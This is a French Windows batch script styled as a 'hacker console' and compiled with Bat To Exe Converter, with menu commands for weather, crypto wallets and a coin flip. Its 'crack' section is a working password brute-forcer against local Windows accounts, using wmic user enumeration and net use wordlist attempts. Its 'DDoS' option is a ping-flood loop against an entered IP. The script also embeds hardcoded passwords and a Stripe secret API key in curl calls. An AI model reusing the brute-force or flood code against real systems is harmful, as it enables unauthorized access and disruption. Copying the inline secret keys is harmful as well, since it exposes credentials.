::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdFu5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdFu5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBNQ
::cRYluBh/LU+EWAjk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJnZks0
::ZQ05rAF9IBncCkqN+0xwdVsDAlTi
::ZQ05rAF9IAHYFVzEqQIYKRhfSRbCFWWpD7EZiA==
::eg0/rx1wNQPfEVWB+kM9LVsJDCyDP2C/FPU15vvy6+/n
::fBEirQZwNQPfEVWB+kM9LVsJDCyDP2C/FPU15vvy6+/n
::cRolqwZ3JBvQF1fEqQI4KRhfSRbCP2S0FboQ7Yg=
::dhA7uBVwLU+EWG+F+Ec+PBJaQzeBLmKqEtU=
::YQ03rBFzNR3SWATEwkM8LRVARQqND2ioD6UIiA==
::dhAmsQZ3MwfNWATEwkM8LRVARQqND2ioD6UIiA==
::ZQ0/vhVqMQ3MEVWAtB9wIBpXRwGQfGK0FbwY7ajNjw==
::Zg8zqx1/OA3MEVWAtB9wABpXRwGQfEK0FbwY7ajo/++Tq0wRFOc7cZvS1bru
::dhA7pRFwIByZRRm09VBwHhpYSQqWNWW1Zg==
::Zh4grVQjdCyDJGyX8VAjFA1VQAGMKGK0CYkz5u3f/eORp3E/QfA6eZrn8rWNK+UBqmzqZp8p0zRfgM5s
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
:starta
rem désactive l'affichage des commandes
echo off
rem remise à blanc de l'écran
cls
TITLE hacker inside 
rem /p permet de demanHder le retour de la variable
chcp 65001 >nul
rem remise à blanc
rem arret
color 02
echo ValentinoScript Hacker Console [7.5]
echo by Valentino
:connection
IF NOT EXIST "C:\Hacker Inside\data\" goto installation
python "C:\Hacker Inside\Licence Verification.py"
set /p uttilisateur= entrer le nom d'uttilisateur :
set /p motdepasse= entrer le mot de passe :
IF %uttilisateur% EQU Pepa IF %motdepasse% EQU 847105 goto pepa
cd C:\Hacker Inside\data\user\
IF %uttilisateur% EQU goto nn
IF %motdepasse% EQU goto nn
IF EXIST "C:\Hacker Inside\data\user\%uttilisateur%\%motdepasse%" echo mot de passe correcte
IF EXIST "C:\Hacker Inside\data\user\%uttilisateur%\%motdepasse%" goto passwordclear
IF NOT EXIST "C:\Hacker Inside\data\user\%uttilisateur%\%mot de passe%" echo utilisateur / mot de passe incorrecte
IF NOT EXIST "C:\Hacker Inside\data\user\%uttilisateur%\%mot de passe%" goto nn
goto nn
:pepa
echo tu me manque trop pepa je du fond tu coeur, kiko aussi. Si seulement je l'aurai fait plus tôt j'aurrai PU TE SAUVER
goto COMMANDE
:passwordclear
cls
echo ValentinoScript Hacker Console [7.5]
echo by Valentino
echo entrer le nom d'uttilisateur: %uttilisateur%
echo entrer le mot de passe: ************
goto COMMANDE




:cache
cls
echo ValentinoScript Hacker Console [7.5]
echo by Valentino
echo entrer le nom d'uttilisateur : Valentino
echo entrer le mot de passe : ************
echo Mot de passe correcte
goto COMMANDE
:COMMANDE
set /p commande= entrer une commande: 
IF %commande% EQU DDoS set /p adresse= entrer une adresse ip: 
IF %commande% EQU DDoS goto confddos
IF %commande% EQU meteo goto prev
IF %commande% EQU reset goto rest
IF %commande% EQU test_wifi set /p ipwifi= entrer une adresse ip: 
IF %commande% EQU test_wifi goto wifitest
IF %commande% EQU crack goto chforce
IF %commande% EQU bitcoin python "C:\Hacker Inside\wallet.py"
IF %commande% EQU dogecoin python "C:\Hacker Inside\wallet_dogecoin.py"
IF %commande% EQU litecoin python "C:\Hacker Inside\wallet_litecoin.py"
IF %commande% EQU ecash python "C:\Hacker Inside\wallet_ecash.py"
IF %commande% EQU license python "C:\Hacker Inside\Licence Verification.py"
IF %commande% EQU bitcoin_testnet python "C:\Hacker Inside\Wallet_test3.py"
IF %commande% EQU crypteur python "C:\Hacker Inside\chiffreur.py"
IF %commande% EQU ouiounon goto ouiounon
IF %commande% EQU request-card goto newcard
IF %commande% EQU samosa echo samosa est un vrai baiseur et il est trop gentil, sache que je vous aime fort hikari, pupuce, dada, et tous les autre
goto COMMANDE
:newcard
set /p nomtitulaire= entrez votre nom et prenom:
set /p adresse= entrez votre adresse:
set /p email= entrez votre adresse email:
set /p numtel= entrez votre numero de telephone:
set /p codepostal= entrez votre code postal:
set /p ville= entrez votre ville:
set /p pays= entrez votre pays:
echo requesting a new card...
curl --ssl-no-revoke https://api.stripe.com/v1/issuing/cardholders ^ -u sk_test_51SZC5w9OqYbErdWBm1GzAG2HJlILgI6bjpVzfMJgGFOCoERB37tNRl7YPAcg6mCOtSqIjbJNNidxnPvhwNr664Aj00AUlMqTvr: ^ -d type=individual -d name="%nomtitulaire%" --data-urlencode email="%email%" --data-urlencode phone_number="%numtel%" -d "billing[address][line1]"="%adresse%" -d "billing[address][city]"="%ville%" -d "billing[address][state]"=CA -d "billing[address][country]"="%pays%" -d "billing[address][postal_code]"="%codepostal%"
curl --ssl-no-revoke https://api.stripe.com/v1/issuing/cards \ -u sk_test_51SZC5w9OqYbErdWBm1GzAG2HJlILgI6bjpVzfMJgGFOCoERB37tNRl7YPAcg6mCOtSqIjbJNNidxnPvhwNr664Aj00AUlMqTvr \ -d cardholder=ich_1SZCdk9OqYbErdWBhK0dYMpx \ -d currency=eur \ -d type=virtual
goto COMMANDE
:ouiounon
echo entrer la question
set /p question= ">"
::set /a random1= %random% %% 4 + 1
set /a random1= %random% %% 2 + 1
echo %random1%
IF %random1% EQU 1 echo non
IF %random1% EQU 2 echo oui
::IF %random1% EQU 3 echo moyen
::IF %random1% EQU 4 echo peut etre
goto COMMANDE
:randomm
echo %random%-%random%-%random%-%random%-%random%-%random%
goto randomm


:resetd
echo ATTENTION: Vérifiez bien le chemain entré, un chemain d'accès inccorect peut faire perdre vos données
set /p save= entrer le chemain d'acces de votre sauvegarde minecraft: 
echo Le reset de la difficulté va entrenner la suppression du fichier session.lock et remettre à zero la difficute meme lorsque la difficulte est verouille
echo etes vous sure de remmtre a zero la difficulte ? (O/N)
set /p "choix=>"
if %choix%==O goto resets
if %choix%==o goto resets
if %choix%==n goto COMMANDE
if %choix%==N goto COMMANDE

:resets
echo suppression session.lock ...
del "%save%\session.lock"
echo suppression termine
echo .
echo localisation dossier...
cd "%save%
echo dossier localise
echo.
echo création fichier session.lock
type nul > session.lock
echo creation termine
echo reset reussit
goto COMMANDE
:chforce

echo etes vous sure de lancer l'attaque ? (O/N)
set /p "choix=>"
if %choix%==O goto forcebrute
if %choix%==o goto forcebrute
if %choix%==n goto COMMANDE
if %choix%==N goto COMMANDE

:confddos
echo voulez-vous afficher l'itinéraire ? (O/N)
set /p "choix=>"
if %choix%==O goto trace
if %choix%==o goto trace
if %choix%==n goto NO
if %choix%==N goto NO
:trace
tracert %adresse%
:NO
set /p oct= nombre d'octet dans chaque packet envoye: 
echo nombre de packet envoye par seconde: 15
echo nombre de packet qui sera envoye: infinie
echo etes vous sure de lancer l'attaque? (O/N)
set /p "choix=>"
if %choix%==O goto DDoSRGB
if %choix%==o goto DDoSRGB
if %choix%==n goto COMMANDE
if %choix%==N goto COMMANDE
:DDoSRGB

set /a random1= %random% %% 9-1
color %random1%
ping %adresse% -n 1 -l %oct% -w 1
goto DDoSRGB

:gcolor
set /a random1= %random% %% 9-1
color %random1%
goto gcolor

:PREV
set /p ville= entrer une ville ou un pays: 
curl wttr.in/%ville%
goto COMMANDE
:rest
cls
goto starta
:wifitest
tracert %ipwifi%
ping %ipwifi%
goto COMMANDE
:cofr
if EXIST "Control Panel.{2227A280-3AEA-1069-A2DE-08002B30309D}" goto ouvre
if NOT EXIST Coffre goto create

:confirm
echo Voulez-vous verrouiller le dossier Coffre?(O/N)
set /p "cho=>"
if %cho%==O goto ferme
if %cho%==o goto ferme
if %cho%==n goto fin
if %cho%==N goto fin
echo Choix incorrect, veuillez r‚pondre Oui ou Non.
goto confirm

:ferme
ren Coffre "Control Panel.{2227A280-3AEA-1069-A2DE-08002B30309D}"
attrib +h +s "Control Panel.{2227A280-3AEA-1069-A2DE-08002B30309D}"
echo Dossier Coffre verouill‚.
goto fin

:ouvre
echo Entrez le mot de passe.
set /p "passout=>"
if %passout% EQU 489620 attrib -h -s "Control Panel.{2227A280-3AEA-1069-A2DE-08002B30309D}"
if %passout% EQU 489620 ren "Control Panel.{2227A280-3AEA-1069-A2DE-08002B30309D}" Coffre
if %passout% EQU 489620 echo Le dossier Coffre est ouvert.
if %passout% NEQ 489620 echo mot de passe incorecte
if %passout% NEQ 489620 goto COMMANDE
goto COMMANDE


:create
md Coffre
echo Le dossier Coffre est cr‚‚.
goto fin

:fin
goto COMMANDE

:forcebrute

setlocal enabledelayedexpansion
chcp 65001 >nul
:start
set error=-
set user=""
set wordlist=""
echo.
echo      ___.                 __          _____                           
echo      \_ ^|_________ __ ___/  ^|_  _____/ ____\___________   ____  ____  
echo       ^| __ \_  __ \  ^|  \   __\/ __ \   __\/  _ \_  __ \_/ ___\/ __ \ 
echo       ^| \_\ \  ^| \/  ^|  /^|  ^| \  ___/^|  ^| (  ^<_^> )  ^| \/\  \__\  ___/ 
echo       ^|___  /__^|  ^|____/ ^|__^|  \___  ^>__^|  \____/^|__^|    \___  ^>___  ^>
echo           \/                       \/                        \/    \/ 
echo.
echo    ╔═══════════════════════╗
echo    ║  COMMANDES:           ║
echo    ║                       ║
echo    ║  1. Liste uttilisateur║
echo    ║  2. force brute       ║
echo    ║  3. sortir            ║
echo    ╚═══════════════════════╝
:input
set /p "=>> " <nul
choice /c 123 >nul

if /I "%errorlevel%" EQU "1" (
  echo.
  echo.
  wmic useraccount where "localaccount='true'" get name,sid,status
  goto input
)

if /I "%errorlevel%" EQU "2" (
  goto bruteforce
)

if /I "%errorlevel%" EQU "3" (
  goto COMMANDE
)

:bruteforce
set /a count=1
echo.
echo.
echo [uttilisateur cible]
set /p user=">> "
echo.
echo [Liste des mots de passe]
set /p wordlist=">> "
if not exist "%wordlist%" echo. && echo [91m[%error%][0m [97mListe non trouvé[0m && pause >nul && goto start
net user %user% >nul 2>&1
if /I "%errorlevel%" NEQ "0" (
  echo.
  echo [91m[%error%][0m [97mle nom d'uttilisateur n'existe pas[0m
  pause >nul
  goto start
)
net use \\127.0.0.1 /d /y >nul 2>&1
echo.
for /f "tokens=*" %%a in (%wordlist%) do (
  set pass=%%a
  call :varset
)
echo.
echo [91m[%error%][0m [97mLe mot de passe n'as pas ete trouve[0m
pause >nul
goto start

:success
echo.
echo [92m[+][0m [97MMot de passe trouve: %pass%[0m
net use \\127.0.0.1 /d /y >nul 2>&1
set user=
set pass=
echo.
pause >nul
goto start

:varset
net use \\127.0.0.1 /user:%user% %pass% 2>&1 | find "System error 1331" >nul
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if /I "%errorlevel%" EQU "0" goto success
net use | find "\\127.0.0.1" >nul
if /I "%errorlevel%" EQU "0" goto success 

:installation
cd C:\Hacker Inside\
::echo Le compileur Python est nécéssère au fonctionnement de l'application. Voulez-vous l'installer ? (O/N) (vous êtes obligé)
::set /p "cho=>"
::IF %cho% EQU O goto installp
::IF %cho% EQU N goto installconfirm
::IF %cho% EQU o goto installp
::IF %cho% EQU n goto :installconfirm
goto installp
:installp
echo en installant l'application, vous acceptez les termes de la licence Mozilla Public License Version 2.0 (O/N)
set /p "cho=>"
IF %cho% NEQ O IF %cho% NEQ o goto nn
IF %cho% EQU N goto nn
IF %cho% EQU n goto nn
::echo appyuez sur un touche quand vous avez terminé d'installer python
::timeout 1
echo cette apllication nécéssite le module cryptography, pycryptodome, qrcode[pil], bitcoinlib. Voulez-vous l'installer ? (O/N) (vous êtes également obligé)
set /p "cho=>"
IF %cho% EQU O goto installconfirm
IF %cho% EQU N goto nn
IF %cho% EQU o goto installconfirm
IF %cho% EQU n goto nn
:installconfirm
pip install cryptography
pip install pycryptodome
pip install qrcode[pil]
pip install bitcoinlib
pip install requests
pip install mnemonic
pip install pywin32
python "C:\Hacker Inside\Logo Creator"
set /p user= choisissez un nom d'utilisateur: 
echo choisissez un mot de passe, Ne l'utilisez pas autre part
set /p "password=>
cd C:\Hacker Inside\
md data
cd C:\Hacker Inside\data\
md user
cd C:\Hacker Inside\data\user\
md %user%
cd C:\Hacker Inside\data\user\%user%
md %password%
cd C:\Hacker Inside\config\
echo installation terminé, merci de nous avoir choisi (pour une fois que quelqu'un installe un de mes appli)
goto connection
:nn
echo fermer la fenêtre
goto nnfin
:nnfin

goto nnfin

:keychecker
python "C:\Hacker Inside\Key Checker.py"
goto connection


